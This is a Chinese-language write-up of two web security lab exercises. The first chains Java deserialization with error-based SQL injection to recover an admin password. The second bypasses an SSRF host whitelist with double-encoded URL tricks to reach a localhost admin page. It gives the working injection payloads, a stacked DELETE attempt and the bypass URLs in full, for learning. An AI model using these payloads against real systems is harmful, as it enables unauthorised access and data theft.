## Q1

### 考點

JAVA 反序列化串 SQL injection

### 解題過程

知道是一題要打反序列化的題目，有給我使用者帳號密碼 `wiener/peter` 就先登入看看

登入成功之後，先去看 `cookie`，有看到 `session` 這個 key，且 value 是 `rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBpdGowMHEyNjdrbWNxbmVqNW1jc250c3B5cWdjMzNicXQABndpZW5lcg==`

後面看到了兩個 `=`，先確認是 `base64` 編碼過的，然後在最前面有看到 `rO0AB`，可以知道是一個 java 序列化資料

但是手邊沒有 class 的資訊，用 `dirsearch` 掃過，找到 `/backup` 目錄，裡面有兩隻 java 原始碼
![](https://i.imgur.com/WuzWiZE.png)

AccessTokenUser.java
```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

ProductTemplate.java
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

知道 `ProductTemplate` 實作 `Serializable`，`readObject` 能 `sql injection`，那把 `session` 蓋成我要的 `payload` 就能攻擊了
```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

直接編譯一個能把 `ProductTemplate` 序列化的程式，並隨便補上 `Product` 類別
目錄結構：
```
-- Main.java
 \_data
     \_productcatalog
         \_Product.java
         \_ProductTemplate.java
```

編譯好之後，開始測 `payload`
1. `' UNION SELECT 1,2,3,4--` 測欄位數量
回傳 `each UNION query must have the same number of columns Position`
直到 8 個的時候改回傳了 `UNION types character varying and integer cannot be matched Position` 代表欄位為 8 個
2. 改用 `' UNION SELECT 'a','b','c','d','e','f','g','h' --`
吃 `invalid input syntax for type integer: "d"`
這樣就有報錯能拿資料
因為 'e', 'g' 兩個欄位也是整數，然後想要靠 'd' 噴錯，利用 `CAST` 轉型錯誤拿資料
3. 繼續用 `' UNION SELECT 'a','b','c',CAST(table_name as int),0,'f',0,'h' FROM information_schema.tables --`
回傳 `invalid input syntax for type integer: "users"`，知道 `table_name` 為 `user`
4. `' UNION SELECT 'a','b','c',CAST(column_name as int),0,'f',0,'h' FROM information_schema.columns WHERE table_name='users' --`
拿到 `invalid input syntax for type integer: "username"`
5. `' UNION SELECT 'a','b','c',CAST(column_name as int),0,'f',0,'h' FROM information_schema.columns WHERE table_name='users' AND column_name!='username' --`
回 `invalid input syntax for type integer: "password"`
知道帳號欄位是 `username` 與密碼是 `password`
6. 最後 `' UNION SELECT 'a','b','c',CAST(password as int),0,'f',0,'h' FROM users WHERE username='administrator' --`
拿到 administrator 密碼為 **`ruu2hebwzyzgi44jid2e`**

登入後把 Carlos 刪掉後成功通過
![](https://i.imgur.com/T2XMoJZ.png)


### 補充

本來想嘗試用 ysoserial 來進行攻擊，直接抓 `CommonsCollections` 來測，彈 shell 回來，但最後吃了 500 就先回到用 sql injection 的做法了。

想說測試 `statement.executeQuery` 是否能直接 `DELETE` 題目要求的帳號
`1'; DELETE FROM users WHERE username='Carlos' --`
結果吃到 `Multiple ResultSets were returned by the query.` 沒法直接刪除，還是需要有管理員帳密。
[stackoverflow](https://stackoverflow.com/a/10804730) 看到如果是 `MySQL` 必須在連線資料庫時，加上 `allowMultiQueries=true`
而這題的資料庫為 `PostgreSQL`，找不太到資料說要怎麼設定才能多重 query。

## Q2

### 考點

SSRF，有白名單限制。
題目要求要進到 `http://localhost/admin`，並刪除 `carlos` 這個帳號。

### 解題過程

![](https://i.imgur.com/rhc2ik8.png)
一開始進到題目網站，就先點點看這些網頁的link，進到 `product?productId=1`，底下有個 `check stock`
按下去之後，`F12` 看到發了 request 到 `/product/stock` 還帶
`stockApi: 
http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`

**看起來就是從這邊打 SSRF 了。**

然後因為打進 `/admin`，直接送請求確實能連到，會有提示訊息 `Admin interface only available if logged in as an administrator, or if requested from loopback`

開 `brupsuite` 送 repeater 帶 `stockApi=http%3a%2f%2flocalhost%2fadmin`

回應說 hostname 需是 `stock.weliketoshop.net`：(被白名單卡到了)
```
"External stock check host must be stock.weliketoshop.net"
```

不確定怎麼繞過，回頭看 [Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet) 跟 [程安投影片](https://github.com/splitline/How-to-Hack-Websites/blob/master/slides/week/week2.pdf)，然後再去看 `orange` 講過玩壞 url parse 的演講 ([投影片](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))

![](https://i.imgur.com/rNAL0h5.png)

![](https://i.imgur.com/JemtqaH.png)

然後再到wiki去找 URI 的資料 [URI(Uniform Resource Identifier) - wiki](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier)
![](https://i.imgur.com/4dkJKhf.png)

先加上 `@` 測試 `userinfo`，`http://user@stock.weliketoshop.net` 有過白名單

然後因為 `#` 感覺是前端解析用的(fragment)，塞在 `@` 的前面再請求一次
想說讓 Sever 解析的時候會認定 `userinfo = localhost#`
然後解出的 `host = stock.weliketoshop.net`，但是一直沒能通過

然後把 `#` encode 一次變成 `%23`，讓 `userinfo = localhost%23`
但還是不行，應該是本來就有做一次 `decode`，所以就再多做一次變成 `%2523`，變 `localhost%2523` 後就通過 hostname 白名單

想在 `localhost` 加上 `/admin`，讓網址為 `http://localhost/admin%2523@stock.weliketoshop.net`，但是卻又被白名單卡住，測試把 `/admin` 放到 `stock.weliketoshop.net` 後面變成 `http://localhost%2523@stock.weliketoshop.net`，再發一次請求就成功進到 `/admin`

![](https://i.imgur.com/YCHw02T.png)

最後直接對 `/admin/delete?username=carlos` 請求就完成了～

### 補充

`http://localhost%2523@stock.weliketoshop.net:2147483647/admin`
上面這個網址在解析的時候，`stock.weliketoshop.net` 後面的冒號正常來說是 `port`，但是與真正請求的 `hostname` 沒有關係，但只能是數字，而且要小於 `2^31-1` 這個值，因為從給了一堆 0 來測試，先確定了位數之後，再由最高位從 9 往下測試，只要沒有報錯就繼續往下一位，能確定解析的時候，`port` 是以**有號整數**儲存的

---

`http://localhost%2523@stock.weliketoshop.net:2147483647//admin`
如果給了 `//admin` 會 not found

---

`http://localhost:80%2523@stock.weliketoshop.net:2147483647//admin`
在 `localhost` 後面補上 `port` 也能正常請求，所以真正的 `port` 是前面的那一個

---

`http://localhost:80%2523@stock.weliketoshop.net:2147483647?/admin` 跟 `http://localhost:80%2523@stock.weliketoshop.net:2147483647#/admin`
會被截斷在 `?` 與 `#` 處，所以只會請求到 `/` 而不會請求 `admin`

---

```
http://localhost:80%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523%2523@stock.weliketoshop.net:2147483647/admin
```

也測試瘋狂給 encode 過的 `#`，可以正常解析
也有串到總長到 60000 多字過，但網頁還是能正常解析，可能打不了 `regex DoS`

---

`http://localhost:80%2523@stock.weliketoshop.net:2147483647/admin???????&&&&&#?%2523&1=1#?#`
上面這個在 `admin` 後面可以有無限多連續的 `?` 跟 `&`，但 `#` 不能連著出現(但可以 `#%2523`)


## 參考資料

* https://github.com/w181496/Web-CTF-Cheatsheet
* https://github.com/splitline/How-to-Hack-Websites/blob/master/slides/week/week2.pdf
* https://github.com/frohoff/ysoserial
* https://github.com/maurosoria/dirsearch
* https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
* https://en.wikipedia.org/wiki/Uniform_Resource_Identifier
* https://www.anquanke.com/post/id/255222
* https://www.rfc-editor.org/rfc/rfc3986#section-3.2
